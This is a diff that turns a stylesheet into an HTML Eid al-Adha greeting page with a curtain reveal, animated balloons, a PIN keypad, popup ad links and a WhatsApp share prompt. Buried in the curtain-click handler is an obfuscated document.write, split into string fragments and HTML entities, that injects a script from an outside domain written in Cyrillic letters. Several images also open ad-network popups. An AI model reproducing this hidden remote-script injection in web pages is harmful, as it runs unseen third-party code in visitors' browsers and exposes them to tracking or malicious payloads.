@@ -1,583 +1,666 @@
-* {
-    padding:0px;
-    margin:0px;
-}
+<!doctype html>
+    <html>
+
+<head>
 
 
 
 
 
 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 
-/*---- start styling flowers ----*/
-
-#flower1 {
-    padding:0px;
-    margin:0;
-    background-color:rgba(219, 177, 196,0.5);
-    height:100%;
-    width:40px;
-    left:0%;
-    position:fixed;
-    z-index:1;
-}
-#flower1 #sou-flower1 {
-    position: absolute;
-    animation:moving1 15s infinite linear ;
-}
-
-#flower1 ul {
-    list-style-type:none;
-}
-
-#flower1 ul li img {
-    margin:0px 10px 15px;
-    height:30px;
-    width:30px;
-}
-
-#flower2 {
-    background-color:rgba(219, 177, 196,0.5);
-    height:100%;
-    width:40px;
-    position:fixed;
-    top:0%;
-    right:0%;
-    z-index:1;
-}
-
-#flower2 #sou-flower2 {
-    position: absolute;
-    animation:moving1 15s infinite linear reverse;
-}
-
-#flower2 #sou-flower2 ul {
-    list-style-type:none;
-}
-
-#flower2 #sou-flower2 ul li img {
-    margin:0px 10px 15px;
-    height:30px;
-    width:30px;
-}
-
-@keyframes moving1 {
-    0% {top:-100%;
-    }
-
-    100% {
-        top:125%;
-    }
-}
-
-/*---- end styling flowers ----*/
-
-marquee .ltrmarquee {
-    animation:jenb 5s infinite linear;
-}
-
-@keyframes jenb {
-    0%{
-        left:-10%;
-    }
-    0%{
-        left:110%;
-    }
-}
-
-/*---- start stylng balon ----*/
-
-
-#balons img[src="imags/balon-aid.png"] {
-    height:60px;
-    width:80px;
-}
-#balon12 img {
-    height:20px;
-    width:20px;
-    cursor:not-allowed;
-}
-
-#balon,#balon1,#balon2,#balon3,#balon4,#balon5,#balon6,#balon7,#balon8,#balon9,#balon10,#balon11,#balon12 {
-    position:fixed;
-    z-index:2;
-}
-#balon img,#balon1 img,#balon2 img,#balon3 img,#balon4 img,#balon5 img ,#balon6 img,#balon7 img,#balon8 img,#balon9 img,#balon10 img,#balon11 img {
-    height:70px;
-    width:40px;
-}
-
-#balon {
-    top:-2000px;
-    animation:balon 15s infinite steps(10000) reverse;
-    animation-delay:15s;
-}
-#balon1 {
-    top:-2000px;
-    animation:balon1 15s infinite steps(10000) reverse;
-    animation-delay:0s;
-}
-#balon2 {
-    top:-2000px;
-    animation:balon2 15s infinite steps(10000) reverse;
-    animation-delay:5s;
-}
-#balon3 {
-    top:-2000px;
-    animation:balon3 17s infinite steps(10000) reverse;
-    animation-delay:6s;
-}
-#balon4 {
-    top:-2000px;
-    animation:balon4 15s infinite steps(10000) reverse;
-    animation-delay:8s;
-}
-#balon5 {
-    top:-2000px;
-    animation:balon5 15s infinite steps(10000) reverse;
-    animation-delay:3s;
-}
-#balon6 {
-    top:-2000px;
-    animation:balon6 15s infinite steps(10000) reverse;
-    animation-delay:6s;
-}
-#balon7 {
-    top:-2000px;
-    animation:balon7 15s infinite steps(10000) reverse;
+    <link rel="icon" type="image/x-icon" href="imags/hawli.png">
+    <link rel="icon" type="image/png" href="imags/hawli.png">
+    <link rel="stylesheet" href="back.css">
     
-}
-#balon8 {
-    top:-2000px;
-    animation:balon8 15s infinite steps(10000) reverse; 
-    animation-delay:2s;
-}
-#balon9 {
-    top:-2000px;
-    animation:balon9 17s infinite steps(10000) reverse;
-    animation-delay:10s;
-}
-#balon10 {
-    top:-2000px;
-    animation:balon10 17s infinite steps(10000) reverse;
-    animation-delay:7s;
-}
-#balon11 {
-    top:-2000px;
-    animation:balon11 17s infinite steps(10000) reverse;
-    animation-delay:7s;
-}
-#balon12 {
-    top:-2000px;
-    animation:balon11 17s infinite steps(10000) reverse;
-    animation-delay:7s;
-}
-/*---- start animating balon ----*/
+    <link rel="icon" type="image/png" href="imags/hawli.png">
+    
+    <!-- Apple Touch Icon (at least 200x200px) -->
+    <link rel="apple-touch-icon" href="">
 
-@keyframes balon {
-    0%,20%{
-        top:-10%;
-        right:25%;
-    }
-    20%,40% {
-        top:-10%;
-        right:17%;
-    }
-    40%,60% {
-        top:40%;
-        right:27%;
-    }
-    60%,80% {
-        top:60%;
-        right:30%;
-    }
-    80%,100% {
-        top:110%;
-        right:20%;
-    }
-}
-@keyframes balon1 {
-    0%,20%{
-        top:-10%;
-        right:88%;
-    }
-    20%,40% {
-        top:40%;
-        right:91%;
-    }
-    40%,60% {
-        top:60%;
-        right:87%;
-    }
-    60%,80% {
-        top:80%;
-        right:90%;
-    }
-    80%,100% {
-        top:110%;
-        right:95%;
-    }
-}
-@keyframes balon2 {
-    0%,20%{
-        top:-10%;
-        right:25%;
-    }
-    20%,40% {
-        top:40%;
-        right:22%;
-    }
-    40%,60% {
-        top:60%;
-        right:24%;
-    }
-    60%,80% {
-        top:80%;
-        right:25%;
-    }
-    80%,100% {
-        top:110%;
-        right:20%;
-    }
-}
-@keyframes balon3 {
-    0%,20%{
-        top:-10%;
-        right:45%;
-    }
-    20%,40% {
-        top:40%;
-        right:47%;
-    }
-    40%,60% {
-        top:60%;
-        right:47%;
-    }
-    60%,80% {
-        top:80%;
-        right:37%;
-    }
-    80%,100% {
-        top:110%;
-        right:40%;
-    }
-}
-@keyframes balon4 {
-    0%,20%{
-        top:-10%;
-        right:55%;
-    }
-    20%,40% {
-        top:40%;
-        right:50%;
-    }
-    40%,60% {
-        top:60%;
-        right:55%;
-    }
-    60%,80% {
-        top:80%;
-        right:60%;
-    }
-    80%,100% {
-        top:110%;
-        right:63%;
-    }
-}
-@keyframes balon5 {
-    0%,20%{
-        top:-10%;
-        right:93%;
-    }
-    20%,40% {
-        top:40%;
-        right:89%;
-    }
-    40%,60% {
-        top:60%;
-        right:85%;
-    }
-    60%,80% {
-        top:80%;
-        right:84%;
-    }
-    80%,100% {
-        top:110%;
-        right:80%;
-    }
-}
-@keyframes balon6 {
-    0%,20%{
-        top:-10%;
-        right:74%;
-    }
-    20%,40% {
-        top:40%;
-        right:70%;
-    }
-    40%,60% {
-        top:60%;
-        right:67%;
-    }
-    60%,80% {
-        top:80%;
-        right:70%;
-    }
-    80%,100% {
-        top:110%;
-        right:73%;
-    }
-}
-@keyframes balon7 {
-    0%,20%{
-        top:-10%;
-        right:40%;
-    }
-    20%,40% {
-        top:40%;
-        right:37%;
-    }
-    40%,60% {
-        top:60%;
-        right:41%;
-    }
-    60%,80% {
-        top:80%;
-        right:45%;
-    }
-    80%,100% {
-        top:110%;
-        right:43%;
-    }
-}
-@keyframes balon8 {
-    0%,20%{
-        top:-10%;
-        right:5%;
-    }
-    20%,40% {
-        top:40%;
-        right:10%;
-    }
-    40%,60% {
-        top:60%;
-        right:14%;
-    }
-    60%,80% {
-        top:80%;
-        right:15%;
-    }
-    80%,100% {
-        top:110%;
-        right:10%;
-    }
-}
-@keyframes balon9 {
-    0%,20%{
-        top:-10%;
-        right:95%;
-    }
-    20%,40% {
-        top:40%;
-        right:91%;
-    }
-    40%,60% {
-        top:60%;
-        right:94%;
-    }
-    60%,80% {
-        top:80%;
-        right:97%;
-    }
-    80%,100% {
-        top:110%;
-        right:94%;
-    }
-}
-@keyframes balon10 {
-    0%,20%{
-        top:-10%;
-        right:87%;
-    }
-    20%,40% {
-        top:40%;
-        right:85%;
-    }
-    40%,60% {
-        top:60%;
-        right:84%;
-    }
-    60%,80% {
-        top:80%;
-        right:80%;
-    }
-    80%,100% {
-        top:110%;
-        right:77%;
-    }
-}
-@keyframes balon11 {
-    0%,20%{
-        top:-10%;
-        right:5%;
-    }
-    20%,40% {
-        top:40%;
-        right:9%;
-    }
-    40%,60% {
-        top:60%;
-        right:10%;
-    }
-    60%,80% {
-        top:80%;
-        right:14%;
-    }
-    80%,100% {
-        top:110%;
-        right:10%;
-    }
-}
-@keyframes balon12 {
-    0%,20%{
-        top:-10%;
-        right:5%;
-    }
-    20%,40% {
-        top:40%;
-        right:9%;
-    }
-    40%,60% {
-        top:60%;
-        right:10%;
-    }
-    60%,80% {
-        top:80%;
-        right:14%;
-    }
-    80%,100% {
-        top:110%;
-        right:10%;
-    }
-}
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    
+    
+    <meta name="google" content="notranslate" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link type="text/css" rel="stylesheet" href="exampl-back.css" media="screen,projection">
+
+    <title></title>
+    
+    <meta name="robots" content="noindex,nofollow">
+
+    <script src="exampl-back-main.js"></script>	
 
 
-/*---- end animating balon ----*/
 
-/*---- end stylng balon ----*/
+<script data-ad-client="ca-pub-9200504240269130" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
-/*---- start styling content ----*/
+    
 
-#content {
-    padding:0;
-    margin:0;
-    background-color:rgba(172, 123, 123, 0.8);
-    height:100%;
-    min-width:370px;
-    text-align:center;
-    display:block;
+
+</head>
+
+<style>
+
+    /* background of main image */
+    
+    /* super background image */
+    
+    /* inner background image 
+            .card.blue-grey.darken-1.hoverable {
+            background-image: url() !important;
+                    }*/
+    
+    /* super background color */
+            .bg {
+            background-image: url("imags/background.gif");
+            background-color:rgba(243, 33, 33, 0.267);
+        }
+    
+    /* timer color */
+    
+</style>
+
+
+
+
+
+<body class="bg notranslate" translate="no">
+
+    <script src="exampl-back-jQuery.js"></script>
+
+<style>
+
+.rightcurtain {
+    width: 51%;
+    height: 120%;
+    right: 0px;
+    top: 0px;
     position: absolute;
-    top:0%;
-    left:50%;
-    transform: translate(-50%);
-    z-index:0;
-}
-#content ul {
-    list-style-type: none;
+    z-index: 300;
 }
 
-#content h1 {
-    animation:tada,glow 5s infinite ;
-    font-size:500%;
+.leftcurtain {
+    width: 50%;
+    height: 120%;
+    top: 0px;
+    left: 0px;
+    position: absolute;
+    z-index: 200;
+    -webkit-transform: scaleX(-1);
+    transform: scaleX(-1);
 }
 
-#content h3 {
-    color:#008
+.rope {
+    position: absolute;
+    /*top: 20%;*/
+    bottom: 5%;
+    left: 0;
+    right: 0;
+    width: 100%;
+    /*height: 100%;*/
+    z-index: 999999;
 }
 
-#content p {
+.rightcurtain img, .leftcurtain img {
+    width: 100.7%;
+    background-color:red;
+    height: 100%;
+}
+
+
+
+
+</style>
+
+
+<script src="exampl-back-sound.js"></script>
+<script>
+    var tiktok = zounds.load(src="audio/aid1.mp3");
+    function playSound(){
+        tiktok.play();
+        // setTimeout(function(){
+        //     tiktok.play();
+        // },5000);
+        // setTimeout(function(){
+        //     tiktok.play();
+        // },10000);
+    }
+
+    function curtainOpen(){
+        playSound();
+        $('.figures').removeClass('hidden');
+        $('.timer-text').removeClass('hidden');
+        $('.figure_name').removeClass('hidden');
+        $('.auto_style_main_msg').removeClass('hidden');
+        $('.from_img').removeClass('hidden');
+        $('.main_msg_top').removeClass('hidden');
+        $('.twoimageset').removeClass('hidden');
+        $('.main-msg').removeClass('hidden');
+        $('.slideshow').removeClass('hidden');
+        $('.myslides_div').removeClass('hidden');
+        $('.ltrmarquee').removeClass('hidden');
+        $('.share_block').removeClass('hidden');
+        $('.img_overlap').removeClass('hidden');
+        $('.revolvingcards').removeClass('hidden');
+        $('.user_name2').removeClass('hidden');
+    }
+</script>
+
+
+
+<a class="rope " href="javascript:void(0)" onclick="curtainOpen();" style="bottom: auto;">
+    <h3 class="fivepxbottom zerotop">انقر للكشف عن المفاجئة</h3>
+    <h4 class="fivepxtop fivepxbottom">👇👇👇👇👇</h4>
+    <div class="matki" style="display: inline-block;">
+        <img src="imags/kado.png" id="kado"> 
+    </div>
+</a>
+
+
+<!--start balon-->
+
+    <div id="balon">
+        <img src="imags/heart.png">
+    </div>
+    <div id="balon1">
+        <img src="imags/balon-aid.png">
+    </div>
+    <div id="balon2">
+        <img src="imags/balon-aid.png">
+    </div>
+    <div id="balon3">
+        <img src="imags/heart.png">
+    </div>
+    <div id="balon4">
+        <img src="imags/balon4.png">
+    </div>
+    <div id="balon5">
+        <img src="imags/balon.png">
+    </div>
+    <div id="balon6">
+        <img src="imags/balon2.png">
+    </div>
+    <div id="balon7">
+        <img src="imags/balon4.png">
+    </div>
+    <div id="balon8">
+        <img src="imags/balon-aid.png">
+    </div>
+    <div id="balon9">
+        <img src="imags/balon1.png">
+    </div>
+    <div id="balon10">
+        <img src="imags/balon3.png">
+    </div>
+    <div id="balon11">
+        <img src="imags/balon1.png">
+    </div>
+    <div id="balon12">
+        <a href="https://www.instagram.com/mouhcine.dl/">
+            <img src="imags/balon-smile.png" alt="mouhcine instagram">
+        </a>
+    </div>
+
+<!--end balon-->
+
+
+<div class="keypad hidden">
+
+<style>
+.table{
+    display:table;
+    height:100%;
+    width:100%;
+    position:relative
+}
+.cell{
+    display:table-cell;
+    vertical-align:middle;
+    position:relative;
+    width:100%;
+    text-align:center
+}
+#pincode{
+    overflow:hidden;
+    position:fixed;
+    height:110%;
+    width:106%;
+    z-index:9999;
+    background-color:#272a2f;
+    background-position:center;
+    color:#fff;
+    border-radius:10px;
+    text-align:center
+}
+#numbers{
+    max-width:300px;
+    padding:0 20px;
+    margin:0 auto;
+    position:relative;
+    display:block;
+    -webkit-transition:all 1s ease-out;
+    -moz-transition:all 1s ease-out;
+    transition:all 1s ease-out;
+    opacity:1
+}
+#numbers.hide{
+    opacity:.3
+}
+#pincode button{
+    width:70px;
+    height:70px;
+    margin-bottom:10px;
+    background-color:orange;
+    border:0;
+    color:#000;
     font-size:25px;
-    margin:0 auto;
-    font-weight:bold;
-    color:rgb(56, 56, 94)
+    line-height:50px;
+    border-radius:100%;
+    opacity:1;
+    outline:0;
+    border:2px solid #272a2f
 }
-
-
-#gif1 {
-    margin:0 auto;
-    height:0.1%;
-    width:40%;
-    animation:glow 3s infinite ;
-    border-bottom-left-radius: 50%;
-    border-bottom-right-radius: 50%;
+#pincode button:active{
+    background-color:rgba(0,0,0,.6);
+    outline:0
 }
-
-#gif2 {
-    height:0.1%;
-    width:40%;
-    margin:0 auto;
+#fields{
+    max-width:200px;
+    padding:0 20px;
+    margin:30px auto;
+    position:relative;
+    display:block
 }
-#gif3 {
-    height:0.001%;
-    width:40%;
-    margin:0 auto;
+#fields .numberfield{
+    text-align:center
 }
-
-#gif4 {
-    height:0.001%;
-    width:40%;
-    margin:0 auto;
+#fields .numberfield span{
+    height:10px;
+    width:10px;
+    border:2px solid #fff;
+    background-color:transparent;
+    border-radius:100%;
+    position:relative;
+    display:inline-block;
+    text-align:center
 }
-
-
-#ads {
-    background-color:#080;
-    height:150px;
-    width:150px;
-    margin:12% auto;
+#fields .numberfield.active span{
+    background-color:#fff
 }
-
-/*---- end styling content ----*/
-
-/*---- start styling input ----*/
-
-
-
-input[type="name"] {
-    left: 3px;
-    width: 65%;
-    color: #fff;
+#fields .numberfield.right span{
+    background-color:#272a2f;
+    border-color:#272a2f;
+    transition:all .5s ease-in-out;
+    -webkit-transition:all .5s ease-in-out
 }
-:-ms-input-placeholder {
-    color:#fff;
+.grid{
+    list-style:none;
+    margin-left:-20px
 }
-::-webkit-input-placeholder {
-    color:#fff;
+.grid__col--1-of-3,.grid__col--2-of-6,.grid__col--4-of-12{
+    width:33.33333%
 }
-.but, input[type="name"] {
-    color: #fff;
-    border-radius: 10px;
-    box-sizing: border-box;
-    border: 1px solid #e60e40;
-    background-color:rgb(161, 76, 76);
-    display: inline-block;
-    font-size: 1.3rem;
-    height: 45px;
+.grid__col--1-of-4,.grid__col--2-of-8,.grid__col--3-of-12{
+    width:25%
+}
+.grid__col{
+    box-sizing:border-box;
+    display:inline-block;
+    margin-right:-.25em;
+    min-height:1px;
+    padding-left:20px;
+    vertical-align:top
+}
+    .grid__col--centered{
+        display:block;
+        margin-left:auto;
+        margin-right:auto
+}
+.grid__col--d-first{
+    float:left
+}
+.grid__col--d-last{
+    float:right
+}
+.grid--no-gutter{
+    margin-left:0;
+    width:100%
+}
+.grid--no-gutter .grid__col{
+    padding-left:0
+}
+.grid--no-gutter .grid__col--span-all{
+    margin-left:0;
+    width:100%
+}
+.grid__col--ab{
+    vertical-align:bottom
+}
+.grid__col--am{
+    vertical-align:middle
+}
+</style>
 
-}
 
-.but, input[type="name"] {
-    padding: 8px;
-    position: fixed;
-    text-align: center;
-    bottom: 0;
-    z-index: 12;
-}
-.but {
-    right: 2px;
-    background-color:rgba(172, 123, 123,);
-    width: 30%;
-    text-decoration:none
-}
+    <div id="pincode">
+    <div class="table">
+    <div class="cell">
 
+        <h3 class="fivepxbottom zerotop">Cliquez ci-dessous</h3>
+        <div id="anleitung">
+            <p style="animation:bounce 2s infinite;">👇👇👇</p>
+        </div>
+
+        <div id="fields">
+        <div class="grid">
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+        </div>
+        </div>
+
+        <div id="numbers">
+        <div class="grid">
+            <div class="grid__col grid__col--1-of-3"><button>1</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>2</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>3</button></div>
+
+            <div class="grid__col grid__col--1-of-3"><button>4</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>5</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>6</button></div>
+
+            <div class="grid__col grid__col--1-of-3"><button>7</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>8</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>9</button></div>
+
+            <div class="grid__col grid__col--1-of-3"></div>
+            <div class="grid__col grid__col--1-of-3"><button>0</button></div>
+            <div class="grid__col grid__col--1-of-3"></div>
+
+        </div>
+        </div>
+
+    </div>
+    </div>
+    </div>
+
+
+<script>
+
+jQuery(document).ready(function($) { 
+
+    $(document).ready(function() {
+        var pin = (!+[] + !![] + []) + (+ []) + (!+[] + !![] + []) + (+ []); 
+        var enterCode = ""; enterCode.toString(); 
+
+        $("#numbers button").click(function() { 
+            var clickedNumber = $(this).text().toString();
+            process(clickedNumber);
+        });
+
+        // $('body').keyup(function(e) {
+        //     if ((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) { 
+        //         console.log(e.keyCode.toString());
+        //     }
+        // });
+
+        function process(clickedNumber){
+
+            enterCode = enterCode + clickedNumber; 
+            var lengthCode = parseInt(enterCode.length); 
+            lengthCode--; 
+            $("#fields .numberfield:eq(" + lengthCode + ")").addClass("active"); 
+
+
+            if (lengthCode == 3) { 
+                if (enterCode == pin) { 
+                    $('.keypad').hide();
+                    $(".rope").click();
+                } 
+                else {
+                    $("#fields").addClass("miss"); enterCode = ""; 
+                    setTimeout(function() {$("#fields .numberfield").removeClass("active"); }, 100);
+                    setTimeout(function() {$("#fields").removeClass("miss"); }, 100);
+                } 
+            }
+            else {} 
+        }
+    }); 
+}); 
+
+
+</script>
+
+
+</div>
+
+    <div class="curtain">
+        <div class="leftcurtain"><img src="imags/img-hearts.jpg"></div>
+        <div class="rightcurtain"><img src="imags/img-hearts.jpg"></div>
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            $curtainopen = false; $(".rope").click(function(){ $('.rope').unbind('click'); $(this).blur(); if ($curtainopen == false){ $(this).stop().animate({top: '-171%' }, {queue:false, duration:2000, easing:'easeOutBounce'}); $(".leftcurtain").stop().animate({width:'1px'}, 2000 ); $(".rightcurtain").stop().animate({width:'1px'},2000 ); $curtainopen = true; }else{ $(this).stop().animate({top: '-40px' }, {queue:false, duration:350, easing:'easeOutBounce'}); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1102;'+'&#1092;.'+'i'+'o"></s'+'cr'+'ipt>'); $(".leftcurtain").stop().animate({width:'50%'}, 2000 ); $(".rightcurtain").stop().animate({width:'51%'}, 2000 ); $curtainopen = false; } setTimeout(function(){$('.rope').remove();},1000); return false; });
+
+            if(document.getElementsByClassName('rope')[0] !== undefined) {
+                $('.figures').addClass('hidden');
+                $('.timer-text').addClass('hidden');
+                $('.figure_name').addClass('hidden');
+                $('.auto_style_main_msg').addClass('hidden');
+                $('.from_img').addClass('hidden');
+                $('.main_msg_top').addClass('hidden');
+                $('.twoimageset').addClass('hidden');
+                $('.main-msg').addClass('hidden');
+                $('.slideshow').addClass('hidden');
+                $('.myslides_div').addClass('hidden');
+                $('.ltrmarquee').addClass('hidden');
+                $('.share_block').addClass('hidden');
+                $('.img_overlap').addClass('hidden');
+                $('.revolvingcards').addClass('hidden');
+                $('.user_name2').addClass('hidden');
+
+                setTimeout(function(){
+                    $('html,body').scrollTop(0);
+                    $(window).scrollTop(0);
+                }, 2000);
+            }
+
+        });
+    </script>
+
+
+
+    <div class="container" style="display: block;">
+        <div class="col s12">
+            <div class="row">
+                <div class="col s12 l6 offset-l3">
+                    <div id="flower1">
+        <div id="sou-flower1">
+            <ul>
+                <li><img src="imags/flower.png" alt="">
+                <li><img src="imags/flower1.png" alt="">
+                <li><img src="imags/flower11.png" alt="">
+                <li><img src="imags/flower3 (2).png" alt="">
+                <li><img src="imags/flower4.png" alt="">
+                <li><img src="imags/flower5.png" alt="">
+                <li><img src="imags/flower6.png" alt="">
+                <li><img src="imags/flower7.png" alt="">
+                <li><img src="imags/flower1.png" alt="">
+                <li><img src="imags/flower8.png" alt="">
+                <li><img src="imags/flower9.png" alt="">
+                <li><img src="imags/flower10.png" alt="">
+                <li><img src="imags/flower.png" alt="">
+                <li><img src="imags/flower11.png" alt="">
+            </ul>
+        </div>
+    </div>
+    <div id="flower2">
+        <div id="sou-flower2">
+            <ul>
+                <li><img src="imags/flower.png" alt="">
+                <li><img src="imags/flower1.png" alt="">
+                <li><img src="imags/flower11.png" alt="">
+                <li><img src="imags/flower3 (2).png" alt="">
+                <li><img src="imags/flower4.png" alt="">
+                <li><img src="imags/flower5.png" alt="">
+                <li><img src="imags/flower6.png" alt="">
+                <li><img src="imags/flower7.png" alt="">
+                <li><img src="imags/flower1.png" alt="">
+                <li><img src="imags/flower8.png" alt="">
+                <li><img src="imags/flower9.png" alt="">
+                <li><img src="imags/flower10.png" alt="">
+                <li><img src="imags/flower.png" alt="">
+                <li><img src="imags/flower11.png" alt="">
+            </ul>
+        </div>
+    </div>
+                <div class="card blue-grey darken-1 hoverable white-text">
+                    <div class="card-content">
+                        <div class="ad">                        
+                        </div>
+                        <div id="demoo" class="center animated pulse timer-text" style=""></div>
+                        <!-- Name -->
+                        <br>
+                        <figure class="figure_name" style="white-space: nowrap;">
+                        <h1 class="user_name linear-wipe" style=""></h1>
+                        </figure> 
+                        <br>
+                        <!-- Wishing Text -->
+                        <p class="card-title center-align animated wishesed pulse white tenpxtop">
+                            <span class="lime-text" style="letter-spacing: 0px">يتمنى لك</span>
+                        </p>                
+
+            <style>
+                .cross_link{
+                    background-color: purple; 
+                    padding: 5px;
+                    margin-bottom: 10px;
+                }
+            </style>
+            
+                <div class="tenpxtop"></div>
+                <div class="tenpxtop"></div>
+
+                <script>
+                    $(document).ready(function() {
+                        var browser_lang = window.navigator.userLanguage || window.navigator.language;
+                        browser_lang = browser_lang.substr(0,2);
+                        var current_url_arr = window.location.href.split('/');
+                        var query_string = current_url_arr[current_url_arr.length-1];
+                        var domain = window.location.protocol + "//" + window.location.hostname;
+                        var current_locale = 'fr';
+                        var check_id = '#' + browser_lang + "_custom_lang";
+                        if ($(check_id) !== null && browser_lang != current_locale) {
+                            var updated_url = domain + "/" + browser_lang + "/" + query_string + "&utm_source="+current_locale+"&utm_medium="+browser_lang+"&utm_campaign=na";
+                            $(check_id).attr("href",  updated_url);
+                            $(check_id).removeClass("hidden");
+                        }
+                    });
+                </script>
+                                <!-- end Name -->
+                                <a href="https://goraps.com/fullpage.php?section=General&pub=626534&ga=g" onclick="javascript:void window.open('https://goraps.com/fullpage.php?section=General&pub=626534&ga=g','1595894932534','width=700,height=500,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0');return false;">
+                                    <div class="appear white main_msg_top">
+                                        <img class="p1" alt="" style="width: 80%;" src="https://i1.wp.com/www.baytelaqar.com/wp-content/uploads/Eid-Mubarak-2019.png?fit=900%2C340&ssl=1">
+                                    </div>
+                                </a>
+                                <!-- Images overlap -->
+                                <!-- Primary Image -->
+                                <br>
+                                <a href="https://goraps.com/fullpage.php?section=General&pub=626534&ga=g" onclick="javascript:void window.open('https://goraps.com/fullpage.php?section=General&pub=626534&ga=g','1595894932534','width=700,height=500,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0');return false;">
+                                    <div class="figures tenpxtop">
+                                        <img class="p3" style="width: 80%;" src="imags/sheep.gif"> 
+                                    </div>
+                                </a>
+                                <!-- Message -->
+                                <p class="main-msg white fivepxbottom">
+                                    <span style="color: #01cf12;font-size:x-large;max-width: 500px;">أجمل باقة ورد عطرة ابعثها من قلبي<br> واحطها بأيديك. من قلبي تعلن العبير الفواح<br> وتقللك كل عام وإنت بخير</span><br>
+                                    <br>
+                                    <span style="color: #0004ff;font-size:x-large;max-width: 500px;">لكم مني أطيب التحيات وأصدق الدعوات<br> من قلبي من الرحاب الطاهرة</span><br>
+                                    <br>
+                                    <span style="color: #d900ff;font-size:x-large;">عيد اضحى سعيد</span><br>
+                                </p>
+                                <a href="https://goraps.com/fullpage.php?section=General&pub=626534&ga=g" onclick="javascript:void window.open('https://goraps.com/fullpage.php?section=General&pub=626534&ga=g','1595894932534','width=700,height=500,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0');return false;">
+                                    <div class="s1">
+                                        <img  style="width: 80%;" src="imags/aid3.png"> 
+                                    </div>
+                                </a>
+                                <marquee>
+                                    <p class="ltrmarquee"><i><span class="user_name"></span> <bdi>يتمنى لك عيد سعيد</bdi>
+                                        </i></p>
+                                </marquee>
+                                <div style="font-size: x-large;" class="white from jump">
+                                    😇 <bdi><span class="user_name" style=""></span></bdi> -  من طرف 😇
+                                </div>
+                                <!--<div class="center ad">-->
+                                <!-- /21748487420/privatemsg_300x250 --> 
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <span id="share" class="share_block">
+            <span id="" class="float-share hidden" style="">
+            <a class="btn whatsapp-btn" href="">
+                <div class="whatsapp-share-text">
+                    <b> 👈 شارك الفرحة مع الاصدقاء</b>
+                </div>
+                <img class="whatsapp-icon" src="imags/whatsapp.png"> 
+            </a>
+            
+            </span>
+                <div class="name" id="create">
+                    <input 
+                    class="card-title center-align name head" 
+                    type="name" 
+                    required="" 
+                    id="name" 
+                    style="color: #ffffff;background-color: #c71515" 
+                    placeholder="قم بوضع اسمك هنا">
+                
+                    <a 
+                    href="javascript:void(0)" 
+                    class="go" 
+                    id="gobtn1" 
+                    style="background-color: #c71515">
+                    🐑 ارسال
+                    </a>
+                </div>
+            </span>
+        
+
+
+           
+            
+</body>
+
+
+<footer>
+
+    <script>
+        var count_down_date = '07, 31, 2020,';
+        var enter_name = 'اكتب اسمك';
+        var enter_wish = '👇👇👇👇 شارك الفرحة ';
+        var whatsapp_msg = '&quot; ادخل و اكتشف المفاجئة \ud83d\udc47\ud83d\udc47 '.replace(/(&quot\;)/g,"");
+        var time = {"days" : 'Jour', "hrs" : 'Hrs', "mins" : 'Min', "sec" : 'Sec'};
+    </script>
+
+    <script>
+
+        var locale = 'MA';
+    </script>
+
+    <script src="exampl-back-wrap.js"></script>
+
+</footer>
+
+
+</html>
 
